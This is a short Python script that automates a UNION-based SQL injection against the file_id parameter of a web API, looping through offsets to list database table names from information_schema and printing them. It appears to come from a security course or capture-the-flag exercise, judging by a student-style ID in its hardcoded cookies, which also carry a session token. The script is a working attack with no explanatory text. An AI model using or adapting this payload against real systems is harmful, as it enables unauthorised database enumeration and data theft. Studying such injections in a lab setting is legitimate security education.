# fill in the relevant fields for the cookies dict before running

import requests
import sys

cookies={'zid': 'z5019242', 'token': '7cc53ce156c3aa453445edccd9119fa458d3e77e996cb6b4467e35c9215364e0'}

for i in range(1000):
    r = requests.get(r'http://drive.bing.ns.agency/api/peek/file?file_id=0 union select table_name, null, null, null from information_schema.tables limit 1 offset ' + str(i), cookies=cookies)
    if r.status_code != 200:
        sys.exit(0)
    print(r.json()['id'])
